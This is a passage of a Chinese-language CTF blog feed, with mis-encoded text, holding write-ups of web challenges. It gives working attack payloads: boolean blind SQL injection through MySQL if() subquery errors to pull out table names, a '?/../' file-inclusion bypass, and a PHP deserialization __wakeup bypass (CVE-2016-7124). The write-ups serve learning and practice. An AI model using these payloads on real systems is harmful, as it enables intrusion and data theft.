class="line"></span><br><span class="line">==================</span><br><span class="line"></span><br><span class="line">[PAYLOAD:]</span><br><span class="line">username=admin&amp;password=&#x27; and sleep(3)#</span><br><span class="line">[OUTPUT:]</span><br><span class="line">HTTP/1.1 200</span><br><span class="line">[æ ¹æ®å‰åå“åº”ï¼Œåˆ¤æ–­æ­¤æ—¶çš„ SQL è¯­å¥åœ¨æ‰§è¡Œæ˜¯åº”è¯¥æ˜¯:]</span><br><span class="line">select * from table where username=&#x27;admin&#x27; and password = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">[PAYLOAD:]</span><br><span class="line">username=admin&amp;password=&#x27; and select(1)#</span><br><span class="line">[OUTPUT:]</span><br><span class="line">HTTP/1.1 500</span><br><span class="line">[æ ¹æ®å‰åå“åº”ï¼Œåˆ¤æ–­æ­¤æ—¶çš„ SQL è¯­å¥åœ¨æ‰§è¡Œæ˜¯åº”è¯¥æ˜¯:]</span><br><span class="line">select * from table where username=&#x27;admin&#x27; and password = &#x27;&#x27; and select(1)#&#x27;</span><br></pre></td></tr></table></figure><br><p>å¹¶ä¸”å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œä¸ç®¡ä¸‡èƒ½å¯†ç æ˜¯å¦å¥æ•ˆï¼Œ and å’Œ or æ€ä¹ˆæ··ç€ç”¨ï¼Œé¡µé¢è¿”å›éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæˆ‘ä»¬åªèƒ½æ ¹æ®çŠ¶æ€ç æ¥åˆ¤æ–­ SQLè¯­å¥æ˜¯å¦ç”Ÿæ•ˆã€‚</p><p>è¿™é‡Œæœ‰ä¸¤ç§æ€è·¯:</p><ol><li><p>æ— å›æ˜¾çš„ SQL æ³¨å…¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ DNSLOG æ¥åˆ›é€ å›æ˜¾ã€‚å¯æƒœè¿™é‡Œçš„ load_file() æ²¡æ³•æ­£å¸¸ä½¿ç”¨ã€‚ load_file() æ— æ³•åˆ¶é€  DNSLOG çš„åŸå› ä¸€èˆ¬ä¸ºä¸¤ä¸ªlï¼š<code>Linuxç¯å¢ƒ</code>æˆ– <code>secure_filr_priv=NULL</code></p></li><li><p>æ—¢ç„¶éœ€è¦æ ¹æ®çŠ¶æ€ç æ¥åˆ¤æ–­SQLè¯­å¥æ‰§è¡ŒçŠ¶æ€ï¼Œæˆ‘ä»¬å°±å¾—è®¾æ³•è®© SQL è¯­å¥æŠ¥é”™ã€‚è¿™é‡Œå°±æ¶‰åŠåˆ°ä¸€ä¸ª <em>Mysql</em> <code>if</code> çš„å°æŠ€å·§</p></li></ol><p>åœ¨ Mysql ä¸­ï¼Œ<code>if</code> çš„åŸºæœ¬ç”¨æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(è¡¨è¾¾å¼, è¡¨è¾¾å¼ä¸º<span class="literal">True</span>æ‰§è¡Œçš„è¯­å¥, è¡¨è¾¾å¼ä¸º<span class="literal">False</span>æ‰§è¡Œçš„è¯­å¥);</span><br></pre></td></tr></table></figure><p>ç®€å•ä½¿ç”¨:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> if((<span class="keyword">select</span> <span class="number">1</span>) ,<span class="number">1</span> , <span class="number">0</span>);</span><br><span class="line">[OUTPUT:]</span><br><span class="line"><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> if((<span class="keyword">select</span> <span class="number">0</span>) ,<span class="number">1</span> , <span class="number">0</span>);</span><br><span class="line">[OUTPUT:]</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå½“è¡¨è¾¾å¼è¿”å› True æ—¶ï¼Œæ˜¯ä¸ä¼šæ‰§è¡Œ <code>if</code> çš„ç¬¬ä¸‰ä¸ªå‚æ•°çš„ã€‚åŒç†ï¼Œå½“è¡¨è¾¾å¼è¿”å› False æ—¶ï¼Œä¹Ÿä¸ä¼šæ‰§è¡Œ <code>if</code> çš„ç¬¬äºŒä¸ªå‚æ•°ã€‚</p><p>å¹¶ä¸” if çš„å‚æ•°åªæ¥å—ä¸€è¡Œå€¼ï¼Œå¦‚æœæ‰§è¡Œçš„å­æŸ¥è¯¢è¿”å›äº†å¤šè¡Œå€¼ï¼Œå°†ä¼šæŠ¥é”™ã€‚</p><p>ç»¼ä¸Šæ‰€è¿°ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ è¿™æ ·çš„ POC</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> if( (<span class="keyword">select</span> <span class="number">1</span>), <span class="number">1</span>, (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> mysql.user) );</span><br><span class="line">[OUTPUT:]</span><br><span class="line"><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> if( (<span class="keyword">select</span> <span class="number">0</span>), <span class="number">1</span>, (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> mysql.user) );</span><br><span class="line">[OUTPUT:]</span><br><span class="line">ERROR <span class="number">1242</span> (<span class="number">21000</span>): Subquery <span class="keyword">returns</span> more than <span class="number">1</span> <span class="type">row</span></span><br></pre></td></tr></table></figure><br><p>æ˜ç™½è¿™ç§æ€§è´¨ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ€§è´¨æ¥è¿›è¡ŒåŸºäº <strong>HTTP code</strong> çš„<strong>å¸ƒå°”ç›²æ³¨</strong>äº†</p><p><strong>Poc:</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[PAYLOAD:]</span><br><span class="line">&#x27; or if( (select 1), 1, (select 1 from mysql.user) )#</span><br><span class="line">[OUTPUT:]</span><br><span class="line">HTTP/1.1 200</span><br><span class="line"></span><br><span class="line">[PAYLOAD:]</span><br><span class="line">&#x27; or if( (select 0), 1, (select 1 from mysql.user) )#</span><br><span class="line">[OUTPUT:]</span><br><span class="line">HTTP/1.1 500</span><br></pre></td></tr></table></figure><br><p>ç»“åˆ substr() å’Œ limit æ³¨è¡¨å:</p><p><span style="color:red">æ³¨æ„:å¦‚æœæƒ³æ‰”åˆ° burp é‡Œè·‘åå…­è¿›åˆ¶çš„è¡¨åã€‚æ³¨æ„åå…­è¿›åˆ¶æ˜¯ 0-9,a-f è€Œä¸æ˜¯å•å•çš„ 0-9ã€‚æˆ‘è¿™é‡Œå°±è¢«å‘äº†ä¸€ä¸‹ã€‚ã€‚ã€‚</span></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[PAYLOAD:]</span><br><span class="line"><span class="string">&#x27; or </span></span><br><span class="line"><span class="string">if( </span></span><br><span class="line"><span class="string">(select </span></span><br><span class="line"><span class="string">substr(</span></span><br><span class="line"><span class="string">(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1)</span></span><br><span class="line"><span class="string">,1,1 )</span></span><br><span class="line"><span class="string">) = 0x55</span></span><br><span class="line"><span class="string">, 1, (select 1 from mysql.user) </span></span><br><span class="line"><span class="string">)#</span></span><br></pre></td></tr></table></figure><p>æœ€åçˆ†å‡ºå¯†ç ç™»é™†åå°ï¼Œå‘ç°é‡Œé¢çš„åŠŸèƒ½ä¼ è¾“æ ¼å¼æ˜¯ json æ ¼å¼ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯ fastjsonçš„æ¼æ´ã€‚å¯æƒœæ²¡æ€ä¹ˆäº†è§£ï¼Œé‚æ²¡æœ‰ç»§ç»­ä¸‹å»ã€‚</p><br><h1 id="Web-Ez-game"><a href="#Web-Ez-game" class="headerlink" title="Web - Ez_game"></a>Web - Ez_game</h1><p>ä¸€å¼€å°±æ˜¯ä¸ªæ¸¸æˆï¼Œæç¤ºé€šå…³æœ‰ FLAG</p><img src="/2021/03/15/2021-03-14-VNCTF2021-log/2.png" style="width:500px;"><p>ç„äº†ä¸€ä¸‹ç½‘ç»œè¯·æ±‚ï¼Œæ²¡æœ‰ä¸åç«¯äº¤äº’çš„è¯·æ±‚ã€‚ä¼°è®¡éƒ½æ˜¯ js å†™çš„ã€‚</p><p>æŸ¥çœ‹é¦–é¡µHTMLæºç ï¼Œå‘ç°æ³¨é‡Šå†™ç€ä¸€å…±æœ‰åå…³</p><p>æ‰¾åˆ°ä¸€ä¸ª js æ–‡ä»¶ game.js ã€‚é‡Œé¢ä¼¼ä¹éƒ½æ˜¯äº›äººç‰©çš„å±æ€§ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PlayerData</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// track player data between levels (when player is destroyed)</span></span><br><span class="line">    <span class="title">constructor</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.health = <span class="number">3</span>;</span><br><span class="line">        <span class="built_in">this</span>.healthMax = <span class="number">3</span>;</span><br><span class="line">        <span class="built_in">this</span>.boomerangs = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">this</span>.bigBoomerangs = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">this</span>.coins = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>å°è¯•ç›´æ¥åœ¨ console æ§åˆ¶å°å¤„ä¿®æ”¹äººç‰©å±æ€§ã€‚å‘ç°äº†ä¸€ä¸ª <em>player</em> å¯¹è±¡</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PlayerÂ </span><br><span class="line">......</span><br><span class="line">health: <span class="number">3</span></span><br><span class="line">healthMax: <span class="number">3</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>å°è¯•ä¿®æ”¹è¿™äº›å±æ€§</p><img src="/2021/03/15/2021-03-14-VNCTF2021-log/3.png" style="width:500px;"><p>å‘ç°æˆ‘ä»¬å˜å¼ºåŠ›äº†ã€‚</p><p>ç©ä¸€ç©è¿™ä¸ªæ¸¸æˆï¼Œç©åˆ°ç¬¬ä¸‰å…³çš„æ—¶å€™ï¼Œå‘ç°æ­»äº¡åé‡ç”Ÿæ—¶å¯ä»¥è¿›å…¥ä¹‹å‰å­˜æ¡£çš„ä¸€å…³ã€‚</p><p>åœ¨ js ä¸­æ‰¾åˆ°ç–‘ä¼¼ å­˜æ¡£å…³å¡çš„ä¸€ä¸ªå€¼ <code>localStorage.kbap_warp</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">NextLevel</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">......</span><br><span class="line">    <span class="comment">// track highest level reached</span></span><br><span class="line">    <span class="keyword">if</span> (!speedRunMode &amp;&amp; levelNumber&gt;warpLevel)</span><br><span class="line">        warpLevel = levelNumber;</span><br><span class="line">    <span class="built_in">localStorage</span>.kbap_warp = warpLevel;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆå¾„ç›´æ¥åˆ°ç¬¬ä¸‰å…³ï¼Œç„¶åè®¾ç½® <code>localStorage.kbap_warp</code> ä¸º 10ï¼Œè¿™æ ·æˆ‘ä»¬æ­»äº¡åå»è¿›å…¥å­˜æ¡£ï¼Œå°±å¯ä»¥ç›´æ¥æ‰“ boss æˆ˜äº†ã€‚</p><p>æ¥åˆ° boss æˆ˜æŠŠè‡ªå·±çš„å±æ€§ä¿®æ”¹å¼ºåŠ›ï¼Œå¾ˆè½»æ¾å°±æ–©æ€ Boss</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ç®€å•è®°å½•ä¸‹ç¬¬äºŒæ¬¡å‚åŠ CTFã€‚ã€‚è™½ç„¶è¿˜æ˜¯åšä¸å‡ºæ¥é¢˜ã€‚ã€‚ã€‚&lt;/p&gt;
&lt;p&gt;è¿™ç¯‡æ–‡ç« ä¸»è¦å°±æ˜¯æƒ³åˆ†äº«ä¸‹ Mysql if çš„ä¸€ä¸ªå°æŠ€å·§ã€‚å¢åŠ ä¸€ä¸ªå¸ƒå°”æ³¨å…¥çš„å°å§¿åŠ¿ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="WEB" scheme="http://example.com/categories/CTF/WEB/"/>
    
    
    <category term="Mysql" scheme="http://example.com/tags/Mysql/"/>
    
    <category term="Javascript" scheme="http://example.com/tags/Javascript/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTFç©è€ç³»åˆ—[1] - [HCTF 2018]WarmUp | [æå®¢å¤§æŒ‘æˆ˜ 2019]PHP | [MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</title>
    <link href="http://example.com/2021/03/13/2021-03-13-buuctf-1/"/>
    <id>http://example.com/2021/03/13/2021-03-13-buuctf-1/</id>
    <published>2021-03-13T03:50:45.000Z</published>
    <updated>2021-03-15T01:51:23.735Z</updated>
    
    <content type="html"><![CDATA[<p>å‘¨æœ«ç©äº†ç©CTFï¼Œåšä¸ªå°è®°å½•</p><p>å¹³å°åœ°å€ï¼š</p><p><a href="https://buuoj.cn/">https://buuoj.cn/</a></p><span id="more"></span><br><h1 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h1><p>è®¿é—®é¶æœºï¼Œåªå‘ç°ä¸€æ»‘ç¨½.</p><p>æŸ¥çœ‹ç½‘é¡µæºç ï¼Œå‘ç°æ³¨é‡Šå†™ç€ <code>source.php</code>ã€‚é‚è®¿é—®ä¹‹ã€‚å¾—åˆ°ä¸€ä¸ª <code>highlight_file</code> çš„ php æºç </p><p>ä»£ç å¯ä»¥é˜‰å‰²æˆå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//ç™½åå•</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// $page å¿…é¡»æ˜¯å­—ç¬¦ä¸²ï¼Œä¸èƒ½ä¼ å…¥æ•°ç»„</span></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å­—ç¬¦ä¸²åˆ‡å‰²ï¼Œåªä¿ç•™ ? å‰é¢çš„éƒ¨åˆ†</span></span><br><span class="line">    <span class="comment">//æ³¨æ„ï¼Œè¿™é‡Œåˆ‡å‰²ä¹‹åçš„å€¼æ˜¯ä¿å­˜åœ¨ $_page ä¸­ï¼Œå¹¶ä¸æ˜¯ä¿®æ”¹äº† $pageã€‚æ‰€ä»¥åŸæ¥çš„ $_REQUEST[&#x27;file&#x27;] å¹¶æ²¡æœ‰æ”¹å˜</span></span><br><span class="line">    <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">        <span class="variable">$page</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    );</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//åˆ¤è¯» $_Ppage æ˜¯å¦åœ¨ç™½åå•ä¸­</span></span><br><span class="line">    <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">    <span class="comment">//æ–‡ä»¶åŒ…å«</span></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç”±äºç™½åå•ä¸­æç¤ºäº†ä¸€ä¸ª <code>hint.php</code> ã€‚è®¿é—®ä¹‹ã€‚æç¤º:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure><br><p>ç»¼åˆä»¥ä¸Šçš„åˆ†æï¼Œæˆ‘ä»¬å¾—çŸ¥è™½ç„¶åœ¨ <code>checkFile()</code> å‡½æ•°ä¸­ï¼Œä¼šå¯¹ <code>$_REQUEST[&#39;file&#39;]</code> è¿›è¡Œæˆªå–ï¼Œä¿ç•™ <code>?</code>ç¬¦å· å‰é¢çš„éƒ¨åˆ†å­˜å…¥  <code>$_page</code> ä¸­ã€‚ä½†æ˜¯æœ€å inlucde çš„è¿˜æ˜¯åŸå§‹çš„ <code>$_REQUEST[&#39;file&#39;]</code>ã€‚</p><br><p>ç»•è¿‡ PAYLOAD:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=source.php?/../hint.php</span><br></pre></td></tr></table></figure><p><code>source.php</code> åé¢ç´§è·Ÿç€ <code>?</code> å·ã€‚ç¡®ä¿åœ¨ <code>checkFile()</code> ä¸­èƒ½å¤Ÿè¿”å› trueã€‚</p><p><code>source.php</code> å’Œ <code>?/</code> ä¸€èµ·ç»„åˆæˆäº† <code>source.php?/</code>ã€‚php å°†ä¼šå°†å…¶å½“ä½œä¸€ä¸ªç›®å½•åï¼Œå³ä½¿è¿™ä¸ªç›®å½•ä¸å­˜åœ¨ã€‚æ¥ç€ä½¿ç”¨ <code>../</code> è·³å‡ºç›®å½•ï¼ŒåŒ…å« <code>hint.php</code> ä»¥éªŒè¯ payloadã€‚</p><br><p>å®éªŒè¯æ˜ï¼Œä¸Šè¿° payload ç¡®å®æœ‰æ•ˆã€‚</p><p>è·å– flag çš„å§¿åŠ¿ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œå°±æ”¹ä¸ªæ–‡ä»¶åå’Œè·¯å¾„è€Œå·²ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯flag åœ¨ Linux æ ¹ç›®å½•ä¸‹è€Œä¸æ˜¯å’Œ Web åŒçº§ã€‚</p><br><h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-PHP"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-PHP" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</h1><p>è®¿é—®é¶æœºï¼Œå‘ç°æç¤º <em>å¤‡ä»½ç½‘ç«™</em>ã€‚é‚å¼€ burp è·‘å­—å…¸</p><p>æ¨èä¸‹ keyå¸ˆå‚… çš„å­—å…¸ã€‚è¿™é‡Œè·‘çš„å­—å…¸ç”¨çš„æ˜¯ <em>Dir/Ctf.txt</em></p><p><a href="https://github.com/gh0stkey/Web-Fuzzing-Box">https://github.com/gh0stkey/Web-Fuzzing-Box</a></p><img src="/2021/03/13/2021-03-13-buuctf-1/2.png" style="width:800px;"><p>è·å¾—å¤‡ä»½æ–‡ä»¶ <a href="http://www.zip.ä¸‹è½½è§£å‹/">www.zipã€‚ä¸‹è½½è§£å‹</a></p><img src="/2021/03/13/2021-03-13-buuctf-1/3.png" style="width:200px;"><br><p>index.php æºç å¯ä»¥é˜‰å‰²æˆè¿™æ ·:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"><span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line"><span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><p>class.php æºç å¯ä»¥é˜‰å‰²æˆè¿™æ ·å¦‚ä¸‹:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="comment">//é­”æœ¯æ–¹æ³•ã€‚åœ¨ååºåˆ—åŒ–æ—¶è‡ªåŠ¨è°ƒç”¨</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//ææ„æ–¹æ³•ï¼Œåœ¨ç±»æ‰§è¡Œå®Œæ¯•èµ„æºå›æ”¶æ—¶è‡ªåŠ¨è°ƒç”¨</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><p>çœ‹åˆ°ä¸€ä¸ª <code>__wakeup()</code> ã€‚è¿™ä¸ªå‡½æ•°ä¼šå°† <code>$this-&gt;username</code> èµ‹å€¼ä¸º <em>guest</em>ã€‚å¯æ˜¯å…¶å€¼éœ€è¦ä¸º <em>admin</em> æ‰èƒ½è·å– flagã€‚</p><p>æˆ‘ä»¬å¯ä»¥è¯•è¯• <em>CVE-2016-7124</em>ã€‚è¿™ä¸ª CVE æ˜¯ä¸“é—¨é’ˆç»•è¿‡ <code>__wakeup()</code>æ–¹æ³•çš„ã€‚å½±å“èŒƒå›´ä¸º <em>PHP before 5.6.25 and 7.x before 7.0.10</em>ã€‚</p><p>åˆ©ç”¨æ–¹å¼ä¸ºï¼Œå½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­ ï¼Œè‹¥å¯¹è±¡å±æ€§æ•°å¤§äºå®é™…å±æ€§æ•°æ—¶ï¼Œ <code>__wakeup()</code> å°†ä¸ä¼šè¢«è‡ªåŠ¨è°ƒç”¨</p><p>è‹¥ä¸ä¼šPHPååºåˆ—åŒ–ï¼Œå®‰åˆ©ä¸‹ä¹‹å‰å†™è¿‡çš„ä¸€ç¯‡æ–‡ç«  :)</p><p><a href="https://www.freebuf.com/articles/web/209975.html">https://www.freebuf.com/articles/web/209975.html</a></p><br><p><strong>poc:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Name();</span><br><span class="line">var_dump(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php5.6 ttt.php</span><br><span class="line">/var/www/html/ctf/ttt.php:12:</span><br><span class="line">string(106) &quot;O:4:&quot;Name&quot;:3:&#123;s:14:&quot;\000Name\000username&quot;;s:5:&quot;admin&quot;;s:14:&quot;\000Name\000password&quot;;i:100;s:15:&quot;\000Name\000password2&quot;;i:100;&#125;&quot;</span><br></pre></td></tr></table></figure><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">åŸ payloadã€‚å®é™…å¯¹è±¡å±æ€§æ•°ä¸º<span class="number">2</span></span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br><span class="line">ä¿®æ”¹å payloadã€‚æ³¨æ„å¯¹è±¡å±æ€§æ•°è¢«ä¿®æ”¹ä¸º <span class="number">3</span>ï¼Œæ¯”å®é™…å¯¹è±¡å±æ€§æ•°å¤§</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00password&quot;</span>;i:<span 